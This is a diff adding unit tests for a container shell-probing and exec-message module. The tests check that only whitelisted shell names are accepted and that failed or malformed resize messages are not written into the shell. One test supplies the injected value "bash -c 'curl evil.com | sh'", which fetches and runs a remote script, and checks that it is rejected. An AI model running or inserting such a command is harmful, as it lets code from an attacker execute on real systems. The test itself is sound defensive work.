@@ -76,10 +76,17 @@ describe('probeShell', () => {
     expect(shell).toBe('');
   });
 
-  test('returns explicit shell without probing', async () => {
+  test('returns explicit shell without probing for whitelisted names', async () => {
     const container = makeMockContainer();
     const shell = await probeShell(container as any, 'zsh');
     expect(shell).toBe('zsh');
+    expect(container.exec).not.toHaveBeenCalled();
+  });
+
+  test('rejects non-whitelisted explicit shell to prevent command injection', async () => {
+    const container = makeMockContainer();
+    const shell = await probeShell(container as any, "bash -c 'curl evil.com | sh'");
+    expect(shell).toBe('');
     expect(container.exec).not.toHaveBeenCalled();
   });
 });
@@ -168,6 +175,29 @@ describe('handleExecMessage', () => {
 
     expect(mockStream.write).toHaveBeenCalledWith('not-json');
     expect(mockExec.resize).not.toHaveBeenCalled();
+  });
+
+  test('resize failure does not fall through to stream.write', async () => {
+    const mockStream = { write: mock(() => {}) };
+    const mockExec = { resize: mock(async () => { throw new Error('docker down'); }) };
+    const resizeMsg = JSON.stringify({ type: 'resize', cols: 120, rows: 40 });
+
+    await handleExecMessage(resizeMsg, mockStream as any, mockExec as any);
+
+    expect(mockExec.resize).toHaveBeenCalled();
+    // Critical: the raw JSON must NOT be typed into the shell when resize fails.
+    expect(mockStream.write).not.toHaveBeenCalled();
+  });
+
+  test('resize with non-finite cols/rows is ignored', async () => {
+    const mockStream = { write: mock(() => {}) };
+    const mockExec = { resize: mock(async () => {}) };
+    const badMsg = JSON.stringify({ type: 'resize', cols: 'abc', rows: null });
+
+    await handleExecMessage(badMsg, mockStream as any, mockExec as any);
+
+    expect(mockExec.resize).not.toHaveBeenCalled();
+    expect(mockStream.write).not.toHaveBeenCalled();
   });
 });
 
